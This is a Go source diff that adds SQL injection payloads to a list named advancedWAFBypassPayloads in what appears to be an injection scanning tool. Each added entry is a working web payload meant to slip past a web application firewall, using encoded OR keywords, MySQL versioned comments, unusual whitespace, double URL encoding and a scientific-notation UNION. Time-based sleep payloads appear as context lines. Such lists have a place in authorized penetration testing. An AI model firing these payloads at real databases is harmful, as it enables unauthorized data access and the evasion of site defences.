@@ -383,6 +383,19 @@ var advancedWAFBypassPayloads = []Payload{
 	{Value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))y)--", Technique: TechTimeBased, DBType: MySQL, Description: "Triple subquery sleep (case-sensitive WAF bypass)", WAFBypass: true},
 	{Value: "1; SELECT pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Stacked pg_sleep", WAFBypass: true},
 	{Value: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Technique: TechTimeBased, DBType: Oracle, Description: "Oracle DBMS_PIPE.RECEIVE_MESSAGE sleep", WAFBypass: true},
+
+	// Hex/encoded keyword bypasses
+	{Value: "' %4fR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Hex-encoded OR keyword", WAFBypass: true},
+	{Value: "'-IF(1=1,1,0)--", Technique: TechBlind, DBType: MSSQL, Description: "IF without spaces", WAFBypass: true},
+	{Value: "'||1=1--", Technique: TechBlind, DBType: PostgreSQL, Description: "Double pipe concat", WAFBypass: true},
+	{Value: "' OR 1<2--", Technique: TechBlind, DBType: Generic, Description: "Less-than comparison bypass", WAFBypass: true},
+	{Value: "'/*!12345OR*/'1'='1'", Technique: TechBlind, DBType: MySQL, Description: "MySQL versioned comment OR", WAFBypass: true},
+	{Value: "'%0bOR%0b'1'='1", Technique: TechBlind, DBType: Generic, Description: "Vertical tab whitespace bypass", WAFBypass: true},
+	{Value: "'%a0OR%a0'1'='1", Technique: TechBlind, DBType: MySQL, Description: "Non-breaking space bypass (MySQL)", WAFBypass: true},
+	// Double-encoding
+	{Value: "'%2527%2520OR%25201=1--", Technique: TechBlind, DBType: Generic, Description: "Double URL encoding", WAFBypass: true},
+	// Scientific notation
+	{Value: "0e1 UNION SELECT 1--", Technique: TechUnion, DBType: MySQL, Description: "Scientific notation bypass", WAFBypass: true},
 }
 
 // oastExfilPayloads exfiltrate query results out-of-band via DNS or
